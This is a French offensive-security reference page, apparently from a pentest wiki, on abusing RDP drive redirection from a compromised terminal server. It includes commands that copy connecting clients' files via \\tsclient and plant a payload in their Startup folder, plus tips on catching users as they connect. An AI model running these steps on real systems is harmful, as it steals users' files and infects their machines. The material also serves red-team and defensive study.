---
title: "Redirection de lecteurs : atteindre les lecteurs client mappés via RDP"
description: "La redirection de lecteurs RDP mappe les lecteurs locaux du client dans la session distante (sous tsclient), afin que les fichiers circulent entre eux. Un attaquant qui contrôle l'hôte distant lit et écrit sur les lecteurs mappés du client qui se connecte, volant des fichiers sur le client et y déposant des charges utiles, transformant une compromission de serveur en accès vers chaque point d'accès qui se connecte."
keywords:
  - drive redirection
  - tsclient
  - rdpdr
  - file access
  - rdp channel
---

# Redirection de lecteurs

RDP peut mapper les lecteurs locaux du client dans la session distante via le canal `rdpdr`, les exposant dans la session sous `\\tsclient\<drive>`. Cela existe pour que les utilisateurs puissent déplacer des fichiers entre leur machine et le serveur, mais c'est un accès à double sens qu'un attaquant détourne depuis le côté serveur. Sur un hôte distant compromis, toute session où un utilisateur a activé la redirection de lecteurs expose les lecteurs client de cet utilisateur à la lecture (vol de ses fichiers) et, là où c'est accessible en écriture, au dépôt de charges utiles (déposer un élément de démarrage ou un document malveillant sur le client). Cela transforme le contrôle d'un serveur de terminaux en accès vers chaque point d'accès qui se connecte avec la redirection de lecteurs activée.

```bash
# in a session on a compromised RDP host, access the connecting client's drives
dir \\tsclient\C                                   # the client's C: drive, if redirected
copy \\tsclient\C\Users\<user>\Documents\* C:\loot\   # steal client files
# plant onto the client's drive for execution on their machine
copy payload.exe "\\tsclient\C\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## Notes d'exploitation

- `\\tsclient\<drive>` est le chemin du lecteur mappé à l'intérieur de la session ; énumérez-le sur un hôte compromis pour trouver quels clients connectés ont exposé des lecteurs et ce qui est atteignable.
- La lecture vole les fichiers du client (documents, clés, identifiants) depuis le côté serveur ; l'écriture sur un lecteur redirigé, là où elle est permise, dépose une persistance ou une charge utile qui s'exécute sur le client, pivotant du serveur vers le point d'accès.
- L'accès n'existe que tant qu'une session avec redirection de lecteurs est connectée ; sur un serveur de terminaux très actif, interroger les lecteurs redirigés capte les utilisateurs au fur et à mesure qu'ils se connectent.
- Combinés à la [redirection du presse-papiers](clipboard-redirection.md), les canaux de redirection de périphériques font d'un hôte RDP compromis un point de collecte des données de chaque client qui se connecte.

## Références

- [MS-RDPEFS (file-system virtual channel)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpefs/)
- [HackTricks: RDP drive redirection](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
